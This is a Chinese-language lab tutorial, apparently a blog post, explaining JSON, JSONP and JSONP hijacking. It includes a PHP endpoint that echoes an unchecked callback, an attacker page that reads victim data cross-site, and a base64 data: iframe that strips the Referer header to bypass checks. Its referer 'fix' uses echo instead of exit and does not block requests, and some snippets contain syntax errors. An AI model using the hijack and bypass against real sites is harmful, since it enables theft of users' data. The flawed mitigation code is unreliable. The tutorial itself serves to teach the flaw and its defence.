JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。																						--摘自网络

### JSON介绍

[JSON官网](https://www.json.org/json-zh.html)

JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。 易于人阅读和编写。同时也易于机器解析和生成。 它基于JavaScript Programming Language, Standard ECMA-262 3rd Edition - December 1999的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。 这些特性使JSON成为理想的数据交换语言.

#### JSON建构于两种结构

"名称/值"对的集合（A collection of name/value pairs）。不同的语言中，它被理解为*对象（object）*、纪录（record）、结构（struct）、字典（dictionary）、哈希表（hash table）、有键列表（keyed list），或者关联数组 （associative array）。 

值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。

这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。

JSON具有以下这些形式

`对象`是一个无序的“‘名称/值’对”集合。一个对象以 {  }。每个“名称”后跟一个 "`:`" ；“名称/值’ 对”之间使用 ,(逗号) 分隔。

![img](https://www.json.org/img/object.png)

`数组`是值（value）的有序集合。一个数组以 [左中括号 开始， ]右中括号 结束。值之间使用 ,逗号分隔

![img](https://www.json.org/img/array.png)

`值`（*value*）可以是双引号括起来的字符串（*string*）、数值(number)、`true`、`false`、 `null`、对象（object）或者数组（array）。这些结构可以嵌套。

![img](https://www.json.org/img/value.png)

`字符串`（*string*）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。

字符串（string）与C或者Java的字符串非常相似。

![img](https://www.json.org/img/string.png)

`数值`（*number*）也与C或者Java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。

![img](https://www.json.org/img/number.png)

空白可以加入到任何符号之间。 以下描述了完整的语言。

![img](https://www.json.org/img/whitespace.png)

### JSONP介绍

JSONP(JSON with Padding) 是 JSON 的一种"使用模式"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。

为什么我们从不同的域（网站）访问数据需要一个特殊的技术( JSONP )呢？这是因为同源策略的限制。

`同源策略`，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。

文件存放另一域名下：

`http://yourls.me:4444/json.txt`

![image-20200627094956151](/images/jsonp/image-20200627094956151.png)

#### XHR调用

`http://bwapp.me:4444/bwAPP/xhr.html`

````php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>XHR</title>
</head>
<script>
    var request = new XMLHttpRequest();

    request.onreadystatechange = function () {
        if (request.readyState === 4) {
            if (request.status === 200) {
                alert('success!');
            }
        }
    }
    request.open('GET', 'http://yourls.me:4444/json.txt');
    request.send();
</script>
<body>
</body>
</html>
````

会因跨域而被浏览器拦截（因同源策略原因无法直接获取其他主机文档信息）

![image-20200627094956151](/images/jsonp/image-20200627094956151.png)

#### 跨域访问

1、html在这个域名下

`http://bwapp.me:4444/data.html`

```html
<html>
<head>
<title>Test</title>
</head>
<body>
<script>
function test(data){
    alert("name:"+data.name+"\n""age:"+data.age);
}
</script>
<script src="http://yourls.me:4444/data.js"></script>
</body>
</html>
```

2、JS文件在此域名下

`http://yourls.me:4444/data.js`

![image-20200627114105044](/images/jsonp/image-20200627114105044.png)

3、访问`http://bwapp.me:4444/data.html`跨域访问成功

![image-20200627114330651](/images/jsonp/image-20200627114330651.png)

#### 问题

bwapp.me直接获取data.js内的数据，因data.js内只有一个函数，如涉及多个函数，data.html(客户端)将导致客户端无法确定调哪个函数。而无法输出对应数据。

data.html

```html
<html>
<head>
<title>Test</title>
</head>
<body>
<script>
function test(data){
    alert("name:"+data.name+"age:"+data.age);
}
//新建一个test1函数
function test1(test3) {
    alert("name:"=test3.name+"city:"+test3.city);
}
</script>
//访问后并不能直接输出对应数据信息。
<script src="http://yourls.me:4444/data.js"></script>
</body>
</html>
```

#### JSONP动态调用

在客户端中添加callback回调函数

data.html

```html
<html>
<head>
    <title>Test</title>
</head>
<body>
    <script>
        function test1(data) {
            alert("name:" + data.name + "city:" + data.city);
        }
        function test2(data) {
            alert("name:" + data.name);
        }
    </script>
    <script src="http://yourls.me:4444/data.php?callback=test1&name=si1ent"></script>
    <!--<script src="http://yourls.me:4444/data.php?callback=test1&name=si1ent"></script>-->
</body>
</html>
```

data.php

```php
<?php
$data1=array("name"=>"si1ent","city"=>"Anhui");
$data2=array("name"=>"admin","city"=>"SH");
if ($_GET['name']==='si1ent') {
    $data=$data1;
}

if ($_GET['name']==='admin') {
    $data=$data2;
}
$callback = $_GET['callback'];
exit($callback."(".json_encode($data).")");
?>
```

访问

`http://bwapp.me:4444/data.html`

`http://yourls.me:4444/data.php?callback=test1&name=si1ent`

![image-20200627134931765](/images/jsonp/image-20200627134931765.png)

注：

因前后端都存在两条以上数据，这里指定了callback==test1因此会弹出名字及城市信息。

如callback=test2，则只会显示name对应值，不显示城市信息。

![image-20200627135745378](/images/jsonp/image-20200627135745378.png)

#### jQuery调用JSONP

```php+HTML
<!DOCTYPE html >
<html>
<head>
<title>Test</title>
</head>
<body>
<script src="http://libs.baidu.com/jquery/1.9.0/jquery.js" type="text/javascript"></script>
</script>
<script type="text/javascript">
    $(document).ready(function(){
        $.ajax({
             type: "get",
             url: "http://yourls.me:4444/data.php?name=admin",
             dataType: "jsonp",
             jsonp: "callback",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)
             jsonpCallback:"test1",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据
             success: function(data){
                 alert("name:"+data.name+"city:"+data.city);
             },
             error: function(){
                 alert('fail');
             }
        });
    });
</script>
</body>
</html>
```

![image-20200627140710365](/images/jsonp/image-20200627140710365.png)

jQuery会自动调用callback函数。

#### 小结

由以上实例及演示得知，JSONP是为了解决跨域而传输JSON格式数据的一种方式。

### 安全

#### JSONP劫持

JSONP本质上属于CSRF(跨站请求伪造：利用更多是修改密码等攻击)，而JSONP主要是攻击目标站点并获取数据的一种攻击方式。

而造成这一问题的主要原因：目标站点未对请求的referer进行限制和检查，导致任何站点都可以访问JSON数据。

#### 攻击流程

后台数据还是以data.php`http://yourls.me:4444/data.php`为主，而此时referer不再是`http://bwapp.me:4444/`而是新的地址`http://jsonp.me:4444/`

 新建jsonp.html文件（放到`http://jsonp.me:4444/`下）

```html
<html>
<script>
function csrf(data){
    alert("name:"+data.name+"city:"+data.city);
}
</script>
<script src="http://yourls.me:4444/data.php?callback=csrf&name=admin">
</script>
</html>
```

结果

`http://jsonp.me:4444/jsonp.html`

![image-20200627142742830](/images/jsonp/image-20200627142742830.png)

#### 修复

1、限制referer

```php
if ($_SERVER['HTTP_REFERER']!=='http://bwapp.me:4444/jquery.html') {
    exit("非法访问");
}
```

以下简单添加referer验证

```php
<?php
$data1=array("name"=>"si1ent","city"=>"Anhui");
$data2=array("name"=>"admin","city"=>"SH");
if ($_SERVER['HTTP_REFERER']!=='http://bwapp.me:4444/jquery.html') {
    echo("非法访问");
}
if ($_GET['name']==='si1ent') {
    $data=$data1;
}

if ($_GET['name']==='admin') {
    $data=$data2;
}
$callback = $_GET['callback'];
exit($callback."(".json_encode($data).")");
?>
```

![image-20200627145813752](/images/jsonp/image-20200627145813752.png)

2、使用token

随机的生成一段token值，每次提交表单都要检查，攻击者没有token就不能访问（token后台服务随机分配）

#### 绕过方式

利用`ftp://,http://,https://,file://,javascript:,data:`这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。

```html
<html>
    <body>
       <iframe src="data:text/html;base64,PHNjcmlwdD4KZnVuY3Rpb24gY3NyZihkYXRhKXsKICAgIGFsZXJ0KCJuYW1lOiIrZGF0YS5uYW1lKyJjaXR5OiIrZGF0YS5jaXR5KTsKfQo8L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHA6Ly95b3VybHMubWU6NDQ0NC9kYXRhLnBocD9jYWxsYmFjaz1jc3JmJm5hbWU9YWRtaW4iPgo8L3NjcmlwdD4=">
    </body>
</html>
```

### 参考

```
https://www.smi1e.top/%E6%B5%85%E8%B0%88-jsonp/
https://xz.aliyun.com/t/6539
https://blog.knownsec.com/2015/03/jsonp_security_technic/
之前乌云drops文档
```
